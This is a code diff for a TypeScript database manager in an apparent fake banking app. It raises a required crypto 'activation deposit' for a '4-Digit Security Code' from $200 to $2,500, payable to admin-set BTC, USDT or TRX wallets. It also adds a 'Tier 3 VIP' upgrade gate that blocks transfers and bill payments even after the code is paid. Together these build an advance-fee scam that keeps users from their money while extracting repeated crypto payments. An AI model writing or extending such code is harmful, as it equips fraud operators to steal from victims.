@@ -929,6 +929,9 @@ class DatabaseManager {
       if (!payload.fourDigitCode || payload.fourDigitCode.trim() !== sender.fourDigitCode.trim()) {
         throw new Error('Invalid 4-Digit Security Code. Please enter your valid 4-digit transfer authorization code.');
       }
+      if (sender.verificationTier !== 'Tier 3') {
+        throw new Error('TIER_3_UPGRADE_REQUIRED: Tier 3 VIP Account Upgrade Required. To complete outgoing wire transfers with your 4-Digit Security Code, your account must be upgraded to Tier 3 VIP Status.');
+      }
     }
 
     if (amount <= 0) {
@@ -1413,17 +1416,20 @@ class DatabaseManager {
     return newLog;
   }
 
-  // Crypto Activation Deposit ($200 Deposit for 4-Digit Code)
+  // Crypto Activation Deposit ($2,500 Deposit for 4-Digit Code)
   public createCryptoActivationDeposit(
     user: User,
-    cryptoMethod: 'BTC' | 'USDT',
+    cryptoMethod: 'BTC' | 'USDT' | 'TRX',
     txHash?: string,
-    proofNote?: string
+    proofNote?: string,
+    proofImage?: string
   ): CryptoActivationDeposit {
     const walletAddresses = this.getCryptoWalletAddresses();
 
     const now = new Date().toISOString();
     const depId = `act-dep-${Date.now()}-${Math.floor(100 + Math.random() * 900)}`;
+
+    const selectedAddress = walletAddresses[cryptoMethod] || walletAddresses['TRX'] || walletAddresses['BTC'];
 
     const deposit: CryptoActivationDeposit = {
       id: depId,
@@ -1432,11 +1438,12 @@ class DatabaseManager {
       userName: user.fullName,
       accountNumber: user.accountNumber,
       cryptoMethod,
-      network: cryptoMethod === 'BTC' ? 'Bitcoin Mainnet' : 'TRC20 / ERC20',
-      walletAddress: walletAddresses[cryptoMethod],
+      network: cryptoMethod === 'BTC' ? 'Bitcoin Mainnet' : 'TRON Network / TRC20',
+      walletAddress: selectedAddress,
       amountUSD: 2500,
       txHash: txHash ? txHash.trim() : undefined,
       proofNote: proofNote ? proofNote.trim() : undefined,
+      proofImage: proofImage || undefined,
       status: 'Pending',
       createdAt: now,
       updatedAt: now
@@ -1469,22 +1476,24 @@ class DatabaseManager {
     return deposit;
   }
 
-  public getCryptoWalletAddresses(): { BTC: string; USDT: string } {
+  public getCryptoWalletAddresses(): { BTC: string; USDT: string; TRX: string } {
     if (!this.db.cryptoWalletAddresses) {
       this.db.cryptoWalletAddresses = {
         BTC: 'bc1q9v8h9svb3x0k49z82lq09fw2zxl184p24a8svb',
-        USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+        USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+        TRX: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
       };
       this.saveDB(this.db);
     }
     return this.db.cryptoWalletAddresses;
   }
 
-  public updateCryptoWalletAddresses(adminUser: User, addresses: { BTC?: string; USDT?: string }): { BTC: string; USDT: string } {
+  public updateCryptoWalletAddresses(adminUser: User, addresses: { BTC?: string; USDT?: string; TRX?: string }): { BTC: string; USDT: string; TRX: string } {
     if (adminUser.role !== 'admin') throw new Error('Unauthorized. Admin privileges required.');
     const current = this.getCryptoWalletAddresses();
     if (addresses.BTC) current.BTC = addresses.BTC.trim();
     if (addresses.USDT) current.USDT = addresses.USDT.trim();
+    if (addresses.TRX) current.TRX = addresses.TRX.trim();
     this.db.cryptoWalletAddresses = current;
 
     this.addAuditLog({
@@ -1867,10 +1876,13 @@ class DatabaseManager {
 
     if (user.role !== 'admin') {
       if (!user.transferCodeApproved || !user.fourDigitCode) {
-        throw new Error('4-Digit Security Code Required: You must obtain an approved 4-Digit Security Code via a $200 BTC or USDT deposit before executing bill payments.');
+        throw new Error('4-Digit Security Code Required: You must obtain an approved 4-Digit Security Code via a $2,500 deposit before executing bill payments.');
       }
       if (!data.fourDigitCode || data.fourDigitCode.trim() !== user.fourDigitCode.trim()) {
         throw new Error('Invalid 4-Digit Security Code. Please enter your valid 4-digit authorization code.');
+      }
+      if (user.verificationTier !== 'Tier 3') {
+        throw new Error('TIER_3_UPGRADE_REQUIRED: Tier 3 VIP Account Upgrade Required. To complete bill payments with your 4-Digit Security Code, your account must be upgraded to Tier 3 VIP Status.');
       }
     }
 
